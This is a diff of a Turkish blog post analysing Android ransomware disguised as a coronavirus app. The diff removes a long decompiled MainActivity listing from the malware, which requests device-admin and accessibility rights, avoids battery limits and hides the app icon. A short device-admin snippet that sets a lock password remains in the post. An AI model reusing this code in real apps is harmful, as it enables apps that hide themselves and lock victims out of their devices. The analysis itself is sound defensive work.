@@ -31,6 +31,7 @@ MainActivity'nin nerede olduğunu öğrendik, şimdi websitedeki ekran görünt�
 &nbsp;
 
 Güya bizi böyle bir arayüz karşılıyor ama gerçek arayüze bakalım 😏
+&nbsp;
 
 <img src="assets/img/corona-main.png" alt="coronavirus app main" border="0" copyright="DomainTools">
 &nbsp;
@@ -44,210 +45,11 @@ MainActivity'nin nerede olduğunu görmüştük diğer aktivitelere de bakalım.
 <img src="assets/img/corona-activities.png" alt="coronavirus app landing" border="0">
 &nbsp;
 
-> * BlockedAppActivity
-> * MainActivity
-> * StartServiceActivity
+>  * BlockedAppActivity
+>  * MainActivity
+>  * StartServiceActivity
 
-Bizleri karşılıyor. MainActivity'e geri dönüp kodları biraz inceleyelim.
-
-```java
-package com.device.security.activities;
-
-import android.app.Activity;
-import android.content.ComponentName;
-import android.content.DialogInterface;
-import android.content.Intent;
-import android.net.Uri;
-import android.os.Build;
-import android.os.Bundle;
-import android.os.PowerManager;
-import android.util.Log;
-import android.widget.Button;
-import android.widget.ImageView;
-import android.widget.Toast;
-import androidx.appcompat.app.AlertDialog;
-import androidx.appcompat.app.AppCompatActivity;
-import androidx.core.app.ActivityCompat;
-import androidx.core.content.ContextCompat;
-import butterknife.BindView;
-import butterknife.ButterKnife;
-import butterknife.OnClick;
-import com.device.security.R;
-import com.device.security.receiver.ActivateDeviceAdminReceiver;
-import com.device.security.util.SharedPreferencesUtil;
-import com.device.security.util.Util;
-
-public class MainActivity extends AppCompatActivity {
-    private static final int ADMIN_REQUEST_CODE_ = 1000;
-    private static final int REQUEST_BATTERY_OPTIMIZATION = 101;
-    private static final int REQUEST_PERMISSION = 100;
-    private static final String TAG = MainActivity.class.getName();
-    static String[] permissions = {"android.permission.FOREGROUND_SERVICE", "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS", "android.permission.RECEIVE_BOOT_COMPLETED"};
-    @BindView(2131165223)
-    Button accessibilityButton;
-    @BindView(2131165267)
-    Button deviceAdminButton;
-    @BindView(2131165282)
-    Button hideAppButton;
-    @BindView(2131165292)
-    ImageView imgAccessibilityPermission;
-    @BindView(2131165293)
-    ImageView imgDeviceAdmin;
-
-    /* access modifiers changed from: protected */
-    public void onCreate(Bundle bundle) {
-        super.onCreate(bundle);
-        setContentView((int) R.layout.activity_main);
-        ButterKnife.bind((Activity) this);
-        if (Build.VERSION.SDK_INT >= 23) {
-            requestBatteryOptimization();
-        }
-    }
-
-    private void requestBatteryOptimization() {
-        try {
-            String packageName = getPackageName();
-            PowerManager powerManager = (PowerManager) getSystemService("power");
-            if (powerManager == null || powerManager.isIgnoringBatteryOptimizations(packageName)) {
-                requestRunTimePermissions();
-                return;
-            }
-            Intent intent = new Intent();
-            intent.setAction("android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS");
-            intent.setData(Uri.parse("package:" + packageName));
-            startActivityForResult(intent, 101);
-        } catch (Exception e) {
-            e.getMessage();
-        }
-    }
-
-    /* access modifiers changed from: protected */
-    public void onActivityResult(int i, int i2, Intent intent) {
-        super.onActivityResult(i, i2, intent);
-        if (i == 1000 && i2 == -1) {
-            this.imgDeviceAdmin.setImageDrawable(ContextCompat.getDrawable(this, R.drawable.ic_check));
-        } else if (i2 == 0 && i == 101) {
-            requestBatteryOptimization();
-        } else if (i2 == -1 && i == 101) {
-            requestRunTimePermissions();
-        }
-    }
-
-    /* access modifiers changed from: package-private */
-    @OnClick({2131165267})
-    public void onDeviceAdminRequest() {
-        if (!Util.isEnabledAsDeviceAdministrator()) {
-            deviceAdministratorRequest();
-        } else {
-            Toast.makeText(getApplicationContext(), "Already Active as Device Admin", 1).show();
-        }
-    }
-
-    /* access modifiers changed from: protected */
-    public void onResume() {
-        super.onResume();
-        if (Util.isAccessibilityEnabled(this)) {
-            this.imgAccessibilityPermission.setImageDrawable(ContextCompat.getDrawable(this, R.drawable.ic_check));
-        }
-        if (Util.isEnabledAsDeviceAdministrator()) {
-            this.imgDeviceAdmin.setImageDrawable(ContextCompat.getDrawable(this, R.drawable.ic_check));
-        }
-    }
-
-    /* access modifiers changed from: package-private */
-    @OnClick({2131165223})
-    public void onAccessibilityPermissionRequest() {
-        if (!Util.isAccessibilityEnabled(this)) {
-            startActivity(new Intent("android.settings.ACCESSIBILITY_SETTINGS"));
-        } else {
-            Toast.makeText(getApplicationContext(), "Permission Already Granted.", 1).show();
-        }
-    }
-
-    /* access modifiers changed from: package-private */
-    @OnClick({2131165282})
-    public void onHideApp() {
-        if (!Util.isEnabledAsDeviceAdministrator() || !Util.isAccessibilityEnabled(this)) {
-            Toast.makeText(this, "Please Grant All Permissions", 0).show();
-            return;
-        }
-        Util.startService(this);
-        Util.hideAppIcon(this, getPackageName(), "com.device.security.activities.MainActivity");
-        SharedPreferencesUtil.setAppAsHidden(this, true);
-        finish();
-    }
-
-    private void deviceAdministratorRequest() {
-        ComponentName componentName = new ComponentName(this, ActivateDeviceAdminReceiver.class);
-        Intent intent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
-        intent.putExtra("android.app.action.SET_NEW_PASSWORD", componentName);
-        intent.putExtra("android.app.extra.DEVICE_ADMIN", componentName);
-        startActivityForResult(intent, 1000);
-    }
-
-    private void requestRunTimePermissions() {
-        if (checkSelfPermission(permissions[0]) != 0 || checkSelfPermission(permissions[1]) != 0 || checkSelfPermission(permissions[2]) != 0) {
-            if (ActivityCompat.shouldShowRequestPermissionRationale(this, permissions[0]) || ActivityCompat.shouldShowRequestPermissionRationale(this, permissions[1]) || ActivityCompat.shouldShowRequestPermissionRationale(this, permissions[2])) {
-                displayPermissionRequestDialog();
-            } else {
-                ActivityCompat.requestPermissions(this, permissions, 100);
-            }
-        }
-    }
-
-    public int checkSelfPermission(String str) {
-        return ActivityCompat.checkSelfPermission(this, str);
-    }
-
-    public void onRequestPermissionsResult(int i, String[] strArr, int[] iArr) {
-        super.onRequestPermissionsResult(i, strArr, iArr);
-        if (i == 100) {
-            int length = iArr.length;
-            int i2 = 0;
-            boolean z = false;
-            while (true) {
-                if (i2 < length) {
-                    if (iArr[i2] != 0) {
-                        z = false;
-                        break;
-                    } else {
-                        i2++;
-                        z = true;
-                    }
-                } else {
-                    break;
-                }
-            }
-            if (z) {
-                Log.d(TAG, "All Permissions Granted.");
-            } else if (ActivityCompat.shouldShowRequestPermissionRationale(this, strArr[0]) || ActivityCompat.shouldShowRequestPermissionRationale(this, strArr[1]) || ActivityCompat.shouldShowRequestPermissionRationale(this, strArr[2])) {
-                displayPermissionRequestDialog();
-            }
-        }
-    }
-
-    private void displayPermissionRequestDialog() {
-        AlertDialog.Builder builder = new AlertDialog.Builder(this);
-        builder.setTitle((CharSequence) "Need Permissions");
-        builder.setMessage((CharSequence) "Designius App need Multiple Permissions.\nPlease Grant.");
-        builder.setPositiveButton((CharSequence) "Grant", (DialogInterface.OnClickListener) new DialogInterface.OnClickListener() {
-            public void onClick(DialogInterface dialogInterface, int i) {
-                dialogInterface.cancel();
-                ActivityCompat.requestPermissions(MainActivity.this, MainActivity.permissions, 100);
-            }
-        });
-        builder.setNegativeButton((CharSequence) "Cancel", (DialogInterface.OnClickListener) new DialogInterface.OnClickListener() {
-            public void onClick(DialogInterface dialogInterface, int i) {
-                dialogInterface.cancel();
-            }
-        });
-        builder.setCancelable(false);
-        builder.show();
-    }
-}
-```
-
-Burada bizi ilgilendiren kısım 155.ci satırdaki deviceAdministratorRequest fonksiyonu.
+Bizleri karşılıyor. MainActivity'e geri dönüp kodları biraz inceleyelim. Bizi ilgilendiren kısım 155.ci satırdaki deviceAdministratorRequest fonksiyonu.
 
 ```java
   private void deviceAdministratorRequest() {
@@ -262,6 +64,7 @@ Burada bizi ilgilendiren kısım 155.ci satırdaki deviceAdministratorRequest fo
 Uygulama Device Admin izniyle kilit şifresi koyuyor ve kendini device admin olarak ekliyor.
 
 Peki uygulamanın istediği izinleri verdiğimizde cihazda ne oluyor?
+&nbsp;
 
 <img src="assets/img/corona-ransomware.png" alt="coronavirus app ransomware" border="0" copyright="DomainTools">
 &nbsp;
